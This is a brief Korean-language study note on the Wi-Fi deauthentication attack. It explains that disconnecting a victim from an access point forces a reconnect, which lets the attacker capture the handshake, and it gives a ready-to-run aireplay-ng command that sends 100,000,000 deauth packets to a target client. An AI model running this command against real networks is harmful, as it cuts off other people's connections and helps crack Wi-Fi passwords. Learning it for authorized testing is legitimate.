# hacking attack deauthentication attack - 연결 해제 공격

> wireless 연결을 해제시키는 공격 방법
>
> > handshake 데이터를 얻기 위하여 의도적으로 연결을 해제시키고 희생자가 재연결하기를 기다릴 때 사용할 수 있다.

```sh
# aireplay-ng --deauth [패킷수] -a [접속점_mac주소] -c [클라이언트_mac주소] [인터페이스]

aireplay-ng --deauth 100000000 -a [access_point_macaddress] -c [client_macaddress] wlan0
```
